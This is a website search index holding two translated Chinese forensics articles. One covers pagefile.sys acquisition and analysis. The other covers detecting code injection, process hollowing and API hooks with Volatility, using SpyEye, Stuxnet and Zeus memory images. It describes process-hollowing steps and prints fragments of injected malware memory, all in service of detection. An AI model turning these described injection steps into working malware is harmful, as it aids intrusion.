var relearn_search_index = [
  {
    "content": "【译】取证调查：虚拟内存pagefile.sys 原文：https://www.hackingarticles.in/forensic-investigation-pagefile-sys/\n在这片文章中，我们将学习如何在虚拟内存文件中进行取证调查。这里有很多信息能用于在内存镜像中提取有价值的信息。当然，更多的你还可以直接通过虚拟内存分析而不分析内存镜像。\n在设备上有很多包含很多内存片段的记录。这些文件是pagefile.sys,swapfile.sys和hiberfil.sys。我们将对pagefile.sys进行分析。\n目录 介绍 使用FTK imager获取内存和虚拟内存 使用Belkasoft Evidence Centre分析 介绍 pagefile.sys也指在windows操作系统中被用于swap交换文件或者虚拟内存文件存储超出物理内存容量部分的信息。pagefile.sys在windows操作系统的位置位于 C:\\pagefile.sys。windows操作系统最高支持16个分页文件；目前只有一个被使用。\n无论处于什么目的，当你在Windows中打开一个应用，你的PC将会用到RAM内存。当你打开更多的应用超出了PC内存能够容纳的范围，在内存中运行的程序将会被移动到虚拟内存中。这就是分页或者意味着分页文件被用作强化了内存，也被称为虚拟内存。\n使用获取内存和虚拟内存 我们将使用FTK imager获取虚拟内存pagefile.sys。\nFTK imager是一个镜像和数据查看工具，FTK imager通常创建系统镜像（取证镜像）电子证据。你可以在这里下载FTK imager（https://www.exterro.com/ftk-imager）\n点击capture memory创建内存镜像。 下一步是选择保存的目录，勾选”include pagefile“，点击获取内存capture memory。 内存获取进程将会在点击capture memory按钮之后开始。 进程结束后，内存镜像和虚拟内存就会被写在之前选定的目录中。 使用Belkasoft Evidence Centre分析 现在我们来Belkasoft Evidence Centre分析写入pagefile.sys。Belkasoft Evidence Centre是一个集成获取、分析和刻入数字证据的分析工具。你可以在这里下载免费版本的工具（https://belkasoft.com/get）\n首先，我们创建个新的case。填写case信息，选择有管理权限的文件夹，如果你想的话，你还可以添加一个case的描述。点击“create and open”执行分析。 用于分析虚拟内存文件，选择配置RAM image内存镜像；添加使用FTK imager镜像的pagefile.sys文件。\n选择想要的数据类型进行搜索。这里有大量的数据类型可以扫描。点击完成按钮即可。 完成了上述步骤后会显示这样一个面板。展示了正确的关于虚拟内存的统计数据信息。总数1097个文件被识别，其中包括URLs、图片和其他文件。 在这个case explorer标签在dashboard标签旁边可以扩展和查看每个概要文件列。数据被切分为浏览器、图片、系统文件和其他文件。 让我们展开分析Browser配置文件。让我们检查chrome切分部分的更多细节，其中之一被分为chrome历史记录包含了URLs。其中高亮的部分就是历史访问的URL地址列。\n另一个浏览器配置是opera浏览器，分析opera部分的内容也是同样，其中展示了URL浏览记录。 从配置文件切分的数据也包含了一些图片信息。这些图片是我访问过的网站的图片或者是其他缩略图。 belkasoft evidence center的一个非常好的特性是，它允许你简单在图片上按右键，可以进行分析各方面，例如检查皮肤、图片中的色情信息，特定的文字或者脸。所有的这些特性都在分析的时候会起到比较有用的效果。 一些系统文件也被从虚拟内存中切分，显示了NetBios名字，文件地址，文件大小等数据。 时间轴标签展示了数据切分的整体情况可以通过时间和URL来进行简单的分析历史访问的网站。 search results标签展示搜索结果概要的工具。下面的截图展示了搜索引擎返回的带有link和配置文件名的结果。 相同的，你可以对休眠文件进行取证调查。使用FTK 在系统C:/hiberfile.sys目录下扩展hiberfil.sys（用于存储系统休眠模式下存储的信息）进行取证，并且使用Belkasoft Evidence Centre进行分析。\n虚拟内存文件的分析对于浏览器鉴定有很大帮助。\n",
    "description": "",
    "tags": "应急响应;调查取证;虚拟内存",
    "title": "【译】取证调查：虚拟内存pagefile.sys",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x03%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/%E8%AF%91%E5%8F%96%E8%AF%81%E8%B0%83%E6%9F%A5%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98pagefile.sys/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "0x03取证分析",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x03%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tags",
    "uri": "/tags/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "应急响应",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - 应急响应;调查取证;虚拟内存",
    "uri": "/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%B0%83%E6%9F%A5%E5%8F%96%E8%AF%81%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/index.html"
  },
  {
    "content": " ​ 是嘟，你找到了一只正在咀嚼竹子的🐼 ……\n",
    "description": "",
    "tags": null,
    "title": "竹林 - Bamboo grove",
    "uri": "/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "恶意样本分析",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/index.html"
  },
  {
    "content": "11. 使用内存取证检测高级恶意软件 在前一章中，我们研究了不同的Volatility插件，它们有助于从内存映像中提取有价值的信息。在本章中，我们将继续我们的内存取证之旅，我们将看到更多的插件，这些插件将帮助你从被高级恶意软件感染的内存映像中提取取证痕迹，这些恶意软件使用了隐身和隐藏技术。在下一节中，我们将重点介绍使用内存取证来检测代码注入技术。下一节将讨论在第8章“代码注入和挂钩”中已经涉及到的一些概念，所以强烈建议在阅读下一节之前阅读这一章。\n1. 检测代码注入 回想一下第8章的代码注入和挂钩，代码注入是一种将恶意代码(如EXE、DLL或shellcode)注入合法进程内存并在合法进程的上下文中执行恶意代码的技术。为了向远程进程注入代码，恶意程序通常会分配一个具有读、写和执行权限的内存(PAGE_EXECUTE_READWRITE)，然后将代码注入到远程进程分配的内存中。要检测注入远程进程的代码，可以根据内存保护和内存内容查找可疑的内存范围。一个引人注目的问题是，什么是可疑的内存范围以及如何获得有关进程内存范围的信息?如果你回想一下前一章(在使用ldrmodules检测隐藏DLL部分)，Windows在内核空间中维护一个名为虚拟地址描述符(VADs)的二叉树结构，每个VAD节点描述进程内存中一个几乎连续的内存区域。如果进程内存区域包含一个内存映射文件(如可执行文件、DLL等)，那么其中一个VAD节点存储有关其基址、文件路径和内存保护的信息。下面的描述不是VAD的准确表示，但它应该有助于您理解这个概念。在下面的截图中，内核空间中的一个VAD节点描述了关于进程可执行文件(explorer.exe)加载位置、它的完整路径和内存保护的信息。类似地，其他VAD节点将描述进程内存范围，包括那些包含映射的可执行映像(如DLL)的进程。这意味着VAD可以用来确定每个相邻进程内存范围的内存保护，它还可以给出包含内存映射镜像文件(如可执行文件或DLL)的内存区域的信息: 1.1 通过采用信息 要从内存映像中获取VAD信息，可以使用vadinfo Volatility插件。下面以vadinfo为例，使用进程ID (pid 2180)显示explorer.exe进程的内存区域。在下面的输出中，内核内存中地址为0x8724d718的第一个VAD节点描述了进程内存中的内存范围0x00db0000-0x0102ffff及其内存保护PAGE_EXECUTE_WRITECOPY。由于第一个节点描述的是一个包含内存映射的可执行映像(explorer.exe)的内存范围，因此它还提供了磁盘上的完整路径。第二个节点0x8723fb50描述了0x004b0000-0x004effff的内存范围，它不包含任何内存映射文件。类似地，地址0x8723fb78的第三个节点显示进程内存范围的信息0x77690,000-0x777cbfff，其中包含ntdll.dll及其内存保护:\n$ python vol.py -f win7.vmem --profile=Win7SP1x86 vadinfo -p 2180 Volatility Foundation Volatility Framework 2.6 VAD node @ 0x8724d718 Start 0x00db0000 End 0x0102ffff Tag Vadm Flags: CommitCharge: 4, Protection: 7, VadType: 2 Protection: PAGE_EXECUTE_WRITECOPY Vad Type: VadImageMap ControlArea @87240008 Segment 82135000 NumberOfSectionReferences: 1 NumberOfPfnReferences: 215 NumberOfMappedViews: 1 NumberOfUserReferences: 2 Control Flags: Accessed: 1, File: 1, Image: 1 FileObject @8723f8c0, Name: \\Device\\HarddiskVolume1\\Windows\\explorer.exe First prototype PTE: 82135030 Last contiguous PTE: fffffffc Flags2: Inherit: 1, LongVad: 1 VAD node @ 0x8723fb50 Start 0x004b0000 End 0x004effff Tag VadS Flags: CommitCharge: 43, PrivateMemory: 1, Protection: 4 Protection: PAGE_READWRITE Vad Type: VadNone VAD node @ 0x8723fb78 Start 0x77690000 End 0x777cbfff Tag Vad Flags: CommitCharge: 9, Protection: 7, VadType: 2 Protection: PAGE_EXECUTE_WRITECOPY Vad Type: VadImageMap ControlArea @8634b790 Segment 899fc008 NumberOfSectionReferences: 2 NumberOfPfnReferences: 223 NumberOfMappedViews: 40 NumberOfUserReferences: 42 Control Flags: Accessed: 1, File: 1, Image: 1 FileObject @8634bc38, Name: \\Device\\HarddiskVolume1\\Windows\\System32\\ntdll.dll First prototype PTE: 899fc038 Last contiguous PTE: fffffffc Flags2: Inherit: 1 [REMOVED] 要使用Windbg内核调试器获取进程的VAD信息，首先需要使用.process命令和_EPROCESS结构的地址将上下文切换到所需的进程。切换上下文后，使用!vad扩展命令显示进程的内存区域。\n1.2 使用VAD检测注入代码 需要注意的重要一点是，当一个可执行映像(如EXE或DLL)通常加载到内存中时，该内存区域会被操作系统赋予一个PAGE_EXECUTE_WRITECOPY(WCX)的内存保护。一个应用程序通常不允许使用像VirtualAllocEx这样的API调用来分配带有PAGE_EXECUTE_WRITECOPY保护的内存。换句话说，如果攻击者想要注入一个PE文件(如EXE或DLL)或shell代码，那么内存 需要分配一个PAGE_EXECUTE_READWRITE(RWX)保护。通常，很少有内存范围具有PAGE_EXECUTE_READWRITE的内存保护。具有PAGE_EXECUTE_READWRITE保护的内存范围并不总是恶意的，因为程序可以为合法目的使用该保护分配内存。为了检测代码注入，我们可以查找包含PAGE_EXECUTE_READWRITE内存保护的内存范围，并检查和验证其内容，以确认是否存在恶意。为了帮助您理解这一点，让我们以一个被SpyEye感染的内存映像为例。此恶意软件将代码注入到合法的explorer.exe进程(pid 1608)。vadinfo插件在explorer.exe进程中显示了两个内存范围，它们对PAGE_EXECUTE_READWRITE有可疑的内存保护:\n$ python vol.py -f spyeye.vmem --profile=Win7SP1x86 vadinfo -p 1608 [REMOVED] VAD node @ 0x86fd9ca8 Start 0x03120000 End 0x03124fff Tag VadS Flags: CommitCharge: 5, MemCommit: 1, PrivateMemory: 1, Protection: 6 Protection: PAGE_EXECUTE_READWRITE Vad Type: VadNone VAD node @ 0x86fd0d00 Start 0x03110000 End 0x03110fff Tag VadS Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6 Protection: PAGE_EXECUTE_READWRITE Vad Type: VadNone仅从内存保护来看，很难断定前面的内存区域是否包含任何恶意代码。为了确定是否存在恶意代码，我们可以转储这些内存区域的内容。要显示内存区域的内容，可以使用volshell插件。下面的命令在explorer.exe进程(pid 1608)的上下文中调用volshell(一个交互式Python shell)db命令转储给定内存地址的内容。要获取帮助信息并显示所支持的volshell命令，只需在volshell中输入hh()。使用db命令转储内存地址0x03120000(上面vadinfo输出的第一个条目)的内容可以看到PE文件的存在。PAGE_EXECUTE_READWRITE的内存保护和PE文件的存在清楚地表明，可执行文件通常没有加载，而是被注入到explorer.exe进程的地址空间中:\n$ python vol.py -f spyeye.vmem --profile=Win7SP1x86 volshell -p 1608 Volatility Foundation Volatility Framework 2.6 Current context: explorer.exe @ 0x86eb4780, pid=1608, ppid=1572 DTB=0x1eb1a340 Python 2.7.13 (default, Jan 19 2017, 14:48:08) \u003e\u003e\u003e db(0x03120000) 0x03120000 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 MZ.............. 0x03120010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 0x03120020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x03120030 00 00 00 00 00 00 00 00 00 00 00 00 d8 00 00 00 ................ 0x03120040 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 ........!..L.!Th 0x03120050 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f is.program.canno 0x03120060 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 t.be.run.in.DOS. 0x03120070 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00 mode....$....... 有时，显示内存区域的内容可能不足以识别恶意代码。当shell代码被注入时尤其如此，在这种情况下，您需要反汇编内容。例如，如果您使用db命令转储地址0x03110000(上面vadinfo输出的第二个条目)的内容，您将看到以下十六进制转储。从输出来看，很难判断这是否是恶意代码:\n\u003e\u003e\u003e db(0x03110000) 0x03110000 64 a1 18 00 00 00 c3 55 8b ec 83 ec 54 83 65 fc d......U....T.e. 0x03110010 00 64 a1 30 00 00 00 8b 40 0c 8b 40 1c 8b 40 08 .d.0....@..@..@. 0x03110020 68 34 05 74 78 50 e8 83 00 00 00 59 59 89 45 f0 h4.txP.....YY.E. 0x03110030 85 c0 74 75 8d 45 ac 89 45 f4 8b 55 f4 c7 02 6b ..tu.E..E..U...k 0x03110040 00 65 00 83 c2 04 c7 02 72 00 6e 00 83 c2 04 c7 .e......r.n..... 如果您怀疑内存区域包含shell代码，可以使用dis命令 在volshell中，在给定地址反汇编代码。从下面代码中显示的反汇编输出中，您可以看出shell代码已经注入到这个内存区域，因为它包含有效的CPU指令。为了验证内存区域是否包含任何恶意代码，您需要进一步分析它，以确定上下文。这是因为注入的代码看起来也类似于合法代码: 1.3 转储进程内存区域 在确定进程内存中注入的代码(PE文件或shellcode)之后，您可能希望将其转储到磁盘以进行进一步分析(用于提取字符串、执行YARA扫描或进行反汇编)。要转储由VAD节点描述的内存区域，可以使用vaddump插件。例如，如果希望转储地址为0x03110000的包含shell代码的内存区域，可以提供-b(——base)选项，后跟基址，如下所示。如果你没有指定-b(——base)选项，插件会将所有内存区域转储到单独的文件中:\n$ python vol.py -f spyeye.vmem --profile=Win7SP1x86 vaddump -p 1608 -b 0x03110000 -D dump/ Volatility Foundation Volatility Framework 2.6 Pid Process Start End Result ---- ----------- ---------- ---------- --------------------------- 1608 explorer.exe 0x03110000 0x03110fff dump/explorer.exe.1deb4780.0x03110000-0x03110fff.dmp 一些恶意软件程序使用隐形技术来绕过检测。例如，恶意程序可能会注入PE文件，并在PE文件加载到内存后清除PE头。在这种情况下，如果你正在查看十六进制转储，它不会给你任何PE文件存在的指示;可能需要一定程度的手工分析来验证代码。在一篇题为“用Volatility恢复CoreFlood 二进制文件”(http://mnin.blogspot/2008/11/recovering-coreflood-binaries-with.html)的博客文章中提到了这样一个恶意软件样本的例子。\n1.4 使用malfind检测注入的代码 到目前为止，我们已经了解了如何使用vadinfo手动识别可疑的内存区域。您还了解了如何使用vaddump转储一个内存区域。还有另一个名为malfind的Volatility插件，它根据内存内容和前面介绍的VAD特征自动识别可疑内存区域。在下面的示例中，当针对感染了SpyEye的内存映像运行malfind时，它会自动识别可疑的内存区域(包含PE文件和shellcode)。除此之外，它还显示十六进制转储和从基地址开始的反汇编。如果不指定-p(——pid)选项，malfind将识别系统上运行的所有进程的可疑内存范围: $ python vol.py -f spyeye.vmem --profile=Win7SP1x86 malfind -p 1608 Volatility Foundation Volatility Framework 2.6 Process: explorer.exe Pid: 1608 Address: 0x3120000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 5, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x03120000 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 MZ.............. 0x03120010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 0x03120020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x03120030 00 00 00 00 00 00 00 00 00 00 00 00 d8 00 00 00 ................ 0x03120000 4d 0x03120001 5a 0x03120002 90 0x03120003 0003 ADD [EBX], AL 0x03120005 0000 ADD [EAX], AL Process: explorer.exe Pid: 1608 Address: 0x3110000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE DEC EBP POP EDX NOP Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x03110000 64 a1 18 00 00 00 c3 55 8b ec 83 ec 54 83 65 fc d......U....T.e. 0x03110010 00 64 a1 30 00 00 00 8b 40 0c 8b 40 1c 8b 40 08 .d.0....@..@..@. 0x03110020 68 34 05 74 78 50 e8 83 00 00 00 59 59 89 45 f0 h4.txP.....YY.E. 0x03110030 85 c0 74 75 8d 45 ac 89 45 f4 8b 55 f4 c7 02 6b ..tu.E..E..U...k 0x03110000 64a118000000 MOV EAX, [FS:0x18] 0x03110006 c3 0x03110007 55 0x03110008 8bec 0x0311000a 83ec54 0x0311000d 8365fc00 0x03110011 64a130000000 MOV EAX, [FS:0x30]2. 调查伪进程注入(Hollow Process Injection) 在前面介绍的代码注入技术中，恶意代码被注入到合法进程的进程地址空间中。伪进程注入(或进程空化)也是一种代码注入技术，但不同的是，在这种技术中，内存中合法进程的进程可执行文件被替换为恶意可执行文件。在讨论伪进程的检测之前，让我们先了解一下它是如何工作的。关于中空过程注入的详细信息在第8章代码注入和挂钩(章节)中介绍过。您还可以查看作者关于伪进程注入的演示和视频演示(https://cysinfo.com/7th-meetup-reversing-and-investigating-malware-evasive-tactics-hollow-process-injection/)，以便更好地理解这个主题。\n2.1 伪进程注入步骤 下面的步骤描述了恶意软件通常是如何执行进程伪装的。假设有两个进程A和B，此时，A进程是恶意进程，B进程是合法进程(也称为远程进程)，例如explorer.exe:\n进程A以挂起的方式启动正常进程B。结果，进程B的可执行部分被加载到内存中，并且PEB(进程环境块)识别到合法进程的完整路径。PEB结构的ImageBaseAddress字段指向装载合法进程可执行文件的基地址。 进程A获得将注入远程进程的恶意可执行文件。这个可执行文件可以来自恶意软件进程的资源部分或来自磁盘上的文件。 进程A确定了合法进程B的基址，这样它就可以解除合法进程的可执行部分的映射。恶意软件可以通过读取PEB来确定基址(在我们的例子中，是PEB.imagebaseaddress)。 然后，进程A释放合法进程的可执行部分。然后进程A将合法进程B中的内存分配为读，写、执行权限。这个内存分配通常是在与之前加载可执行文件的地址相同。 然后进程A将恶意可执行文件的PE头和PE段写入到已分配的内存中。 然后进程A将挂起的线程的起始地址更改为注入的可执行文件的入口点的地址，并恢复正常进程挂起的线程。因此，合法进程现在开始执行恶意代码。 Stuxnet就是这样一种恶意软件，它使用上述步骤执行伪进程注入。具体来说，Stuxnet在挂起模式下创建合法的lasss.exe进程。因此，lasss.exe通过PAGE_EXECUTE_WRITECOPY(WCX)保护加载到内存中。此时(在空化之前)，PEB和VAD都包含关于lasss.exe的内存保护、基址和完整路径的相同元数据信息。然后，Stuxnet将合法的进程可执行文件(lasss.exe)挖空，并在之前加载lasss.exe的同一区域内，用PAGE_EXECUTE_READWRITE (RWX)保护分配一个新的内存，然后在分配的内存中注入恶意的可执行文件并恢复挂起的线程。由于掏空了进程可执行文件，导致VAD和PEB之间的进程路径信息存在差异，即PEB中的进程路径仍然包含lasss.exe的完整路径，而VAD不显示完整路径。此外，在空化之前(WCX)和空化之后(RWX)存在内存保护差异。下面的图表可以帮助你可视化空心化之前发生了什么，以及空心化过程后在PEB和VAD中产生的差异: 使用内存取证技术对震网病毒进行了完整的分析，Michael Hale Ligh在下面的博客文章中写道:http://mnin.blogspot.in/2011/06/examining-stuxnets-footprint-in-memory.html。\n2.2 识别伪进程注入 为了检测中伪进程注入，您可以寻找PEB和VAD之间产生的差异，以及内存保护差异。您还可以查找父子流程关系中的差异。在下面的Stuxnet示例中，您可以看到系统上运行着两个lasss.exe进程。第一个lasss.exe进程(pid 708)有一个父进程winlogon.exe (pid 652)，而第二个lasss.exe进程(pid 1732)有一个终止的父进程(pid 1736)。根据进程信息，你可以判断pid为1732的lasss.exe是可疑的进程，因为在一个干净的系统上，winlogon.exe将是lasss.exe在pre-Vista机器上的父进程，wininit.exe将是lasss.exe在Vista和以后的系统上的父进程:\n$ python vol.py -f stux.vmem --profile=WinXPSP3x86 pslist | grep -i lsass Volatility Foundation Volatility Framework 2.6 0x818c1558 lsass.exe 708 652 24 343 0 0 2016-05-10 06:47:24+0000 0x81759da0 lsass.exe 1732 1736 5 86 0 0 2018-05-12 06:39:42 $ python vol.py -f stux.vmem --profile=WinXPSP3x86 pslist -p 652 Volatility Foundation Volatility Framework 2.6 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start ---------- ------------ ---- ---- ---- ---- --- ------ ------------------ 0x818321c0 winlogon.exe 652 332 23 521 0 0 2016-05-10 06:47:24 $ python vol.py -f stux.vmem --profile=WinXPSP3x86 pslist -p 1736 Volatility Foundation Volatility Framework 2.6 ERROR : volatility.debug : Cannot find PID 1736. If its terminated or unlinked, use psscan and then supply --offset=OFFSET如前所述，您可以通过比较PEB和VAD结构来检测伪进程。dlllist插件从PEB获取模块信息，显示lasss.exe (pid 1732)的完整路径和它加载的base地址(0x01000000):\nlsass.exe pid: 1732 Command line : \"C:\\WINDOWS\\\\system32\\\\lsass.exe\" Service Pack 3 Base Size Load Count Path ---------- ------- ------ ------------------------------- 0x01000000 0x6000 0xffff C:\\WINDOWS\\system32\\lsass.exe 0x7c900000 0xaf000 0xffff C:\\WINDOWS\\system32\\ntdll.dll 0x7c800000 0xf6000 0xffff C:\\WINDOWS\\system32\\kernel32.dll 0x77dd0000 0x9b000 0xffff C:\\WINDOWS\\system32\\ADVAPI32.dll [REMOVED]ldrmodules插件依赖于内核中的VAD，它不会向lasss.exe显示完整的路径名称。由于恶意软件解除了lasss.exe进程可执行部分的映射，完整路径名不再与地址0x01000000关联:\n$ python vol.py -f stux.vmem --profile=WinXPSP3x86 ldrmodules -p 1732 Volatility Foundation Volatility Framework 2.6 Pid Process Base InLoad InInit InMem MappedPath ---- --------- ---------- ------ ------ ------ ---------------------------- [REMOVED] 1732 lsass.exe 0x7c900000 True True True \\WINDOWS\\system32\\ntdll.dll 1732 lsass.exe 0x71ad0000 True True True \\WINDOWS\\system32\\wsock32.dll 1732 lsass.exe 0x77f60000 True True True \\WINDOWS\\system32\\shlwapi.dll 1732 lsass.exe 0x01000000 True False True 1732 lsass.exe 0x76b40000 True True True \\WINDOWS\\system32\\winmm.dll [REMOVED]由于恶意软件通常在空化之后和注入可执行文件之前以PAGE_EXECUTE_READWRITE权限分配内存，所以您可以寻找内存保护。malfind插件在可执行lasss.exe加载的同一地址(0x01000000)识别了可疑的内存保护:\nProcess: lsass.exe Pid: 1732 Address: 0x1000000 Vad Tag: Vad Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 2, Protection: 6 0x01000000 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 MZ.............. 0x01000010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 0x01000020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x01000030 00 00 00 00 00 00 00 00 00 00 00 00 d0 00 00 00 ................ 0x01000000 4d DEC EBP 0x01000001 5a POP EDX 0x01000002 90 NOP如果希望将malfind检测到的可疑内存区域转储到磁盘，可以在-D后面指定将转储所有可疑内存区域的目录名称。\n2.3 进程注入变种 在下面的例子中，我们将看到一个名为Skeeyah的恶意软件，它以一种略微不同的方式执行伪进程注入。这是在第8章代码注入和挂钩(第3.6节中空过程注入)中介绍的同一个示例。以下是Skeeyah所执行的步骤:\n它以挂起模式启动svchost.exe进程。作为一个 结果，svchost.exe被加载到内存中(在本例中，地址为0x1000000)。 它通过读取PEB来确定svchost.exe的基址。ImageBaseAddress，然后释放svchost.exe的可执行部分。 它不是在之前加载svchost.exe的同一区域分配内存(0x1000000)，而是在不同的地址0x00400000，具有读、写和执行权限。 然后覆盖PEB。svchost.exe进程的imagebaseaddress，带有新分配的地址0x00400000。这会将PEB中的svchost.exe的基址从0x1000000更改为0x00400000(其中包含注入的可执行文件)。 然后，它将挂起的线程的起始地址更改为注入的可执行文件的入口点的地址，并恢复线程。 下面的截图显示了空化前后的差异。具体来说，空化后的PEB认为svchost.exe在0x00400000处加载。之前表示svchost.exe(加载在0x1000000)的VAD节点不再存在，因为当恶意软件掏空svchost.exe进程可执行文件时，VAD树中删除了该节点的条目: 要检测伪进程的这种变化，可以遵循相同的方法。根据伪进程的执行方式，结果会有所不同。进程列表显示了svchost.exe进程的多个实例，这是正常的。除了最后一个svchost.exe (pid 1824)之外，所有svchost.exe进程都有一个父进程services.exe (pid 696)。在一个干净的系统中，所有svchos.exe进程都是由services.exe启动的。当您查看svchost.exe (pid 1824)的父进程时，您可以看到它的父进程已经终止。根据进程信息，可以看出最后一个svchost.exe (pid 1824)是可疑的:\n$ python vol.py -f skeeyah.vmem --profile=WinXPSP3x86 pslist | grep -i svchost Volatility Foundation Volatility Framework 2.6 0x815cfaa0 svchost.exe 876 696 20 202 0 0 2016-05-10 06:47:25 0x818c5a78 svchost.exe 960 696 9 227 0 0 2016-05-10 06:47:25 0x8181e558 svchost.exe 1044 696 68 1227 0 0 2016-05-10 06:47:25 0x818c7230 svchost.exe 1104 696 5 59 0 0 2016-05-10 06:47:25 0x81743da0 svchost.exe 1144 696 15 210 0 0 2016-05-10 06:47:25 0x817ba390 svchost.exe 1824 1768 1 26 0 0 2016-05-12 14:43:43 $ python vol.py -f skeeyah.vmem --profile=WinXPSP3x86 pslist -p 696 Volatility Foundation Volatility Framework 2.6 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start ---------- ------------ --- ---- ---- ---- ---- ------ -------------------- 0x8186c980 services.exe 696 652 16 264 0 0 2016-05-10 06:47:24 $ python vol.py -f skeeyah.vmem --profile=WinXPSP3x86 pslist -p 1768 Volatility Foundation Volatility Framework 2.6 ERROR : volatility.debug : Cannot find PID 1768. If its terminated or unlinked, use psscan and then supply --offset=OFFSETdlllist插件(依赖于PEB)显示svchost.exe (pid 1824)的完整路径，并报告base地址为0x00400000。\n$ python vol.py -f skeeyah.vmem --profile=WinXPSP3x86 dlllist -p 1824 Volatility Foundation Volatility Framework 2.6 ************************************************************************ svchost.exe pid: 1824 Command line : \"C:\\WINDOWS\\system32\\svchost.exe\" Service Pack 3 Base Size LoadCount Path ---------- ------- ---------- ---------------------------------- 0x00400000 0x7000 0xffff 0x7c900000 0xaf000 0xffff 0x7c800000 0xf6000 0xffff [REMOVED] C:\\WINDOWS\\system32\\svchost.exe C:\\WINDOWS\\system32\\ntdll.dll C:\\WINDOWS\\system32\\kernel32.dll 另一方面，ldrmodules插件(依赖于内核中的VAD)并没有显示svchost.exe的任何条目，如下图所示: malfind显示在0x00400000地址存在一个PE文件，其中存在一个可疑的PAGE_EXECUTE_READWRITE内存保护，这表明这个可执行文件被注入了，并且没有正常加载:\n$ python vol.py -f skeeyah.vmem --profile=WinXPSP3x86 malfind -p 1824 Volatility Foundation Volatility Framework 2.6 Process: svchost.exe Pid: 1824 Address: 0x400000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 7, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x00400000 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 MZ.............. 0x00400010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 0x00400020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x00400030 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 00 00 ................ 0x00400000 4d DEC EBP 0x00400001 5a POP EDX [REMOVED] 攻击者使用不同的空心工艺注射来绕过、偏转和转移司法分析。关于这些规避技术如何工作以及如何使用自定义Volatility性插件检测它们的详细信息，请观看作者的黑帽演讲:“恶意软件作者不想让你知道的东西-规避伪进程注入”(https://youtu.be/9L9I1T5QDg4)。或者，您可以阅读作者的博客文章在以下链接:https://cysinfo.com/detecting-deception-hollow-techniques/\n3. 检测API钩子 在将恶意代码注入目标进程后，恶意软件可以在目标进程发出的API调用时钩住，以控制其执行路径，并将其重新定位到恶意代码。关于钩子技术的细节已经在第8章，代码注入和钩子(钩子技术一节)中介绍过了。在本节中，我们将主要关注使用内存取证来检测这种挂钩技术。要识别进程和内核内存中的API钩子，你可以使用apihooks Volatility插件。在下面Zeus bot的例子中，一个可执行文件被注入到explorer.exe进程的内存地址0x2c70000，由malfind插件检测到:\n$ python vol.py -f zeus.vmem --profile=Win7SP1x86 malfind Process: explorer.exe Pid: 1608 Address: 0x2c70000 Vad Tag: Vad Protection: PAGE_EXECUTE_READWRITE Flags: Protection: 6 0x02c70000 4d 5a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 MZ.............. 0x02c70010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x02c70020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x02c70030 00 00 00 00 00 00 00 00 00 00 00 00 d8 00 00 00 ................在下面的输出中，apihooks插件在用户模式的API httpendrequestA(在wininet.dll中)中检测钩子。然后，被钩住的API被重定向到地址0x2c7ec48(钩子地址)。钩子地址在注入的可执行文件(钩子模块)的地址范围内。钩子模块的名称是未知的，因为它通常不是从磁盘加载的(而是注入的)。具体来说，在API函数httpendrequesta的起始地址(0x753600fc)，有一个跳转指令，它将httpendrequesta的执行流重定向到注入的可执行文件中的地址0x2c7ec48:\n$ python vol.py -f zeus.vmem --profile=Win7SP1x86 apihooks -p 1608 Hook mode: Usermode Hook type: Inline/Trampoline Process: 1608 (explorer.exe) Victim module: wininet.dll (0x752d0000 - 0x753c4000) Function: wininet.dll!HttpSendRequestA at 0x753600fc Hook address: 0x2c7ec48 Hooking module: \u003cunknown\u003e Disassembly(0): 0x753600fc e947eb918d 0x75360101 83ec38 0x75360104 56 0x75360105 6a38 0x75360107 8d45c8 JMP 0x2c7ec48 SUB ESP, 0x38 PUSH ESI PUSH 0x38 LEA EAX, [EBP-0x38] 4. 内核模式rootkit 